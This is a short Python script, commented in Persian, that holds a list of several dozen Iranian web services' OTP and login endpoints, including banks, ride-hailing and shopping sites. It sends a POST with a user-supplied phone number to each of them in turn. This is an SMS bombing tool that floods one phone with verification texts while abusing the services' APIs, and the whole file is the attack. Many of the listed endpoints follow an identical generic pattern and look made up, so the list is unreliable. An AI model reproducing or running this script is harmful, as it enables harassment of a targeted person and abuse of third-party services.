import requests

# لیست سایت‌ها و مسیر ارسال OTP
sites = [
    {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "param": "phone"},
    {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "param": "mobile"},
    {"name": "Digikala", "url": "https://api.digikala.com/v1/user/authenticate/", "param": "phone"},
    {"name": "Snapp", "url": "https://api.snapp.ir/v1/phone", "param": "phone"},
    {"name": "Tap30", "url": "https://api.tapsi.ir/v1/authenticate", "param": "phone"},
    {"name": "Aparat", "url": "https://www.aparat.com/api/authenticate", "param": "phone"},
    {"name": "Filimo", "url": "https://www.filimo.com/api/authenticate", "param": "phone"},
    {"name": "CafeBazaar", "url": "https://api.cafebazaar.ir/v1/authenticate", "param": "phone"},
    {"name": "Namava", "url": "https://api.namava.ir/v1/authenticate", "param": "phone"},
    {"name": "IranTalent", "url": "https://api.irantalent.com/v1/authenticate", "param": "phone"},
    {"name": "Jobinja", "url": "https://api.jobinja.ir/v1/auth", "param": "phone"},
    {"name": "E-Estekhdam", "url": "https://api.e-estekhdam.com/v1/verify", "param": "phone"},
    {"name": "Mellat Bank", "url": "https://api.bankmellat.ir/v1/verify", "param": "phone"},
    {"name": "Melli Bank Iran", "url": "https://api.bmi.ir/v1/verify", "param": "phone"},
    {"name": "Pinket", "url": "https://api.pinket.com/v1/auth", "param": "phone"},
    {"name": "Sazito", "url": "https://api.sazito.com/v1/authenticate", "param": "phone"},
    {"name": "Shad", "url": "https://api.shad.ir/v1/authenticate", "param": "phone"},
    {"name": "Robika", "url": "https://api.robika.ir/v1/authenticate", "param": "phone"},
    {"name": "Khaneyeh", "url": "https://api.khaneyeh.com/v1/authenticate", "param": "phone"},
    {"name": "ZarinPal", "url": "https://api.zarinpal.com/v1/authenticate", "param": "phone"},
    {"name": "Sibche", "url": "https://api.sibche.com/v1/authenticate", "param": "phone"},
    {"name": "Roudaki", "url": "https://api.roudaki.com/v1/authenticate", "param": "phone"},
    {"name": "IranianApps", "url": "https://api.iranianapps.com/v1/authenticate", "param": "phone"},
    {"name": "Sahand", "url": "https://api.sahand.ir/v1/authenticate", "param": "phone"},
    {"name": "Chaii", "url": "https://api.chaii.ir/v1/authenticate", "param": "phone"},
    {"name": "Sadeghi", "url": "https://api.sadeghi.ir/v1/authenticate", "param": "phone"},
    {"name": "HamrahCard", "url": "https://api.hamrahcard.ir/v1/authenticate", "param": "phone"},
    {"name": "Pishro", "url": "https://api.pishro.ir/v1/authenticate", "param": "phone"},
    {"name": "MehrCard", "url": "https://api.mehrcard.ir/v1/authenticate", "param": "phone"},
    {"name": "Alpina", "url": "https://api.alpina.ir/v1/authenticate", "param": "phone"},
    {"name": "Bamilo", "url": "https://api.bamilo.com/v1/authenticate", "param": "phone"},
    {"name": "ParsiPlus", "url": "https://api.parsiplus.com/v1/authenticate", "param": "phone"},
    {"name": "Nava", "url": "https://api.nava.ir/v1/authenticate", "param": "phone"},
    {"name": "Mojtaba", "url": "https://api.mojtaba.ir/v1/authenticate", "param": "phone"},
    {"name": "Gis", "url": "https://api.gis.ir/v1/authenticate", "param": "phone"},
    {"name": "Bazar", "url": "https://api.bazar.ir/v1/authenticate", "param": "phone"},
    {"name": "Rana", "url": "https://api.rana.ir/v1/authenticate", "param": "phone"},
    {"name": "Arad", "url": "https://api.arad.ir/v1/authenticate", "param": "phone"},
]

# گرفتن شماره تلفن از کاربر
phone_number = input("Please enter your phone number: ")

# ایجاد یک Session برای مدیریت بهتر درخواست‌ها
session = requests.Session()

# ارسال درخواست به تمام سایت‌ها
for site in sites:
    try:
        # ارسال درخواست POST به سایت مورد نظر
        response = session.post(site["url"], json={site["param"]: phone_number})
        
        # بررسی وضعیت پاسخ
        if response.status_code == 200:
            print(f"✅ OTP sent to {site['name']}.")
        else:
            print(f"❌ Error sending OTP to {site['name']}. Status code: {response.status_code}")
    
    except Exception as e:
        # مدیریت خطاهای اتصال
        print(f"❌ Connection error to {site['name']}: {e}")